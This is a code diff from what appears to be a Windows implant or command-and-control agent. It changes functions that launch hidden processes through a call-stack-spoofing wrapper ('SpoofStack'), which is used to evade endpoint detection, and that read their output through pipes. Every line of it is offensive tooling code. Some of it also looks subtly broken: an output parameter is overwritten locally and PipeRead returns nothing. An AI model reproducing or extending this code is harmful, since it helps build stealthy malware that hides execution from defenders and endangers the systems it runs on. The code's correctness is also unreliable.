@@ -122,14 +122,8 @@ BOOL NtProcessCreate(IN PWSTR TargetProcess, IN PWSTR ProcessParameters, IN PWST
 	DWORD Reuslt = ResumeThread(*hThread);
 	if (Reuslt == -1) {
 		printf("[error] failed to resume thread %lu\n", GetLastError());
-		goto _EndOfFunc;
 	}
 
-	PUCHAR Buffer = NULL;
-	INT Length = PipeRead(pPipe, Buffer);
-	if( Length > 0 ){
-		printf("[info] read %d bytes from pipe\n", Length);
-	}
 
 	_EndOfFunc:
 	if(pAttributeList) {
@@ -140,9 +134,8 @@ BOOL NtProcessCreate(IN PWSTR TargetProcess, IN PWSTR ProcessParameters, IN PWST
 
 }
 
-BOOL ProcessCreate(BOOL PIPED, LPWSTR ApplicationName, LPWSTR CommandLine, LPPROCESS_INFORMATION pi, OUT PUCHAR Buffer) {
+BOOL ProcessCreate(IN BOOL PIPED, IN LPSTR ApplicationName, IN LPSTR CommandLine, OUT LPPROCESS_INFORMATION pi, OUT PPIPE pPipe) {
 
-	PPIPE					pPipe						= NULL;
 	pPipe = (PPIPE)agent->apis->pLocalAlloc(LPTR, sizeof(PIPE));
 
 	BOOL Success = 0;
@@ -163,17 +156,10 @@ BOOL ProcessCreate(BOOL PIPED, LPWSTR ApplicationName, LPWSTR CommandLine, LPPRO
 		}
 	}
 
-	Success = (WINBOOL)SpoofStack(agent->apis->pCreateProcessW, 10, ApplicationName, CommandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, pi);
+	Success = (WINBOOL)SpoofStack(agent->apis->pCreateProcessA, 10, ApplicationName, CommandLine, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, pi);
 	if(!Success) {
 		printf("[error] failed to create process %lu\n", GetLastError());
 		return Success;
-	}
-
-
-	DWORD Status = 0;
-	GetExitCodeProcess(pi->hProcess, &Status);
-	if (Status != STILL_ACTIVE) {
-		PipeRead(pPipe, Buffer);
 	}
 
 	return Success;
@@ -194,7 +180,7 @@ BOOL PipeCreate(OUT PPIPE pPipe) {
 	return TRUE;
 }
 
-INT PipeRead(IN PPIPE pPipe, PUCHAR Buffer) {
+INT PipeRead(IN PPIPE pPipe, PUCHAR Buffer, PDWORD dwRead) {
 
 	UCHAR Buf[1024] = {0};
 	DWORD BufferSize = 0;
@@ -225,5 +211,6 @@ INT PipeRead(IN PPIPE pPipe, PUCHAR Buffer) {
 
 	} while (Success == TRUE);
 
+	*dwRead = BufferSize;
 
 }
